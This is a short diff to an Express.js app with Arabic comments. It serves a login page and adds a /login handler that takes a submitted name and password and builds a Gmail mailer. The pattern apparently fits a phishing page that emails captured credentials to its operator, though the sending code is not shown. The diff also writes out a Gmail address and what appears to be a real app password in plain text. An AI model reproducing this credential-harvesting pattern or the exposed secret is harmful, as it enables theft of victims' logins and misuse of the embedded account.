@@ -5,6 +5,11 @@ const app = express();
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
 
+// هذه هي الإضافة المهمة
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/public/index.html');
+});
+
 app.post('/login', (req, res) => {
   const { name, password } = req.body;
 
@@ -12,7 +17,7 @@ app.post('/login', (req, res) => {
     service: 'gmail',
     auth: {
       user: 'itinfor79@gmail.com',
-      pass: 'eqlfoyyxgoknvjne' // تأكد أنها كلمة مرور التطبيقات
+      pass: 'eqlfoyyxgoknvjne'
     }
   });
 
